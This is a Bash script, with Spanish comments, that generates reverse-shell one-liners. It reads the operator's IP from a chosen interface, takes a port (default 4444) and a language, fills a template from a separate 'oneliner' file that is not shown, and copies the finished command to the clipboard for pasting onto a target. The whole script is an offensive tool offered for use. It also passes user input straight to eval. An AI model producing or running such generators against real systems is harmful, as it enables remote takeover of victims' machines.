#!/bin/bash

#
#
#	OneLiner Reverse Shell
#
#					ODBK

source colores
source oneliner

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${amarillo} - Salida Forzada ${finColor}"
	exit 0
}

function ayuda(){
	# Cargo los oneliners
	shells=`cut -d'=' -f1 oneliner`
	langs=`echo $shells`
	echo -e "\n${verde}Reverse Shell Oneliner Generator${finColor}"
	echo -e "\t ${azul}-i${finColor} Interfaz de la cual se obtendrá la IP"
        echo -e "\t ${azul}-p${finColor} Puerto a la escucha. Defecto: 4444"
        echo -e "\t ${azul}-l${finColor} Lenguaje usado para generar la shell. Disponibles:"
	echo -e "\t\t${amarillo}${langs}${finColor}"
        echo -e "\t ${azul}-h${finColor} Muestra esta ayuda"
	exit 0
}


#	MAIN

	while getopts ":i:p:l:h" arg; do
		case $arg in
			i) iface=$OPTARG;;
			p) port=$OPTARG;;
			l) lang=$OPTARG;;
			h) ayuda;;
		esac
	done

	echo -e "\n${verde}Reverse Shell Oneliner Generator${finColor}"

	shells=`cut -d'=' -f1 oneliner`

	# Checamos el puerto
	if [[ $port -eq $port && $port -lt 65536 ]]; then
                echo -e "\n\t${verde}Puerto Seleccionado: ${finColor}"$port
        else
                port=4444
        fi


	# Cargamos todas las interfaces
	ifaces=($(ifconfig | grep flags | awk '{ print $1}' | sed -e 's/:$//'))

	# Checamos que  la interfaz elegida exista si no fallo
	if [[ "${ifaces[@]}" =~ "${iface}" ]]; then
		ip=`ifconfig ${iface} | grep "inet" | grep -v "inet6" | awk '{ print $2}'`
		echo -e "\t${verde}IP Seleccionada: ${finColor}"$ip
	else
		echo -e "\n${rojo}Interfaz erronea .... Saliendo${finColor}"
		exit 0
	fi

	# Checamos lenguaje
	if [[ "${shells[@]}" =~ "${lang}" ]]; then
		line=`eval echo '$'$lang`
		echo -e "\t${verde}RShell Seccionada: ${finColor}"$line
        	oneliner=${line/"##ip##"/$ip}
        	oneliner=${oneliner/"##port##"/$port}
                echo $oneliner | xclip -sel clip
                echo -e "\n${amarillo}Resultado: ${finColor}"$oneliner"\n\n${violeta}En su clipboard si tiene instalado XCLIP"$finColor
        else
                echo -e "\n${rojo}Lenguaje no disponible .... Saliendo${finColor}"
                exit 0
        fi

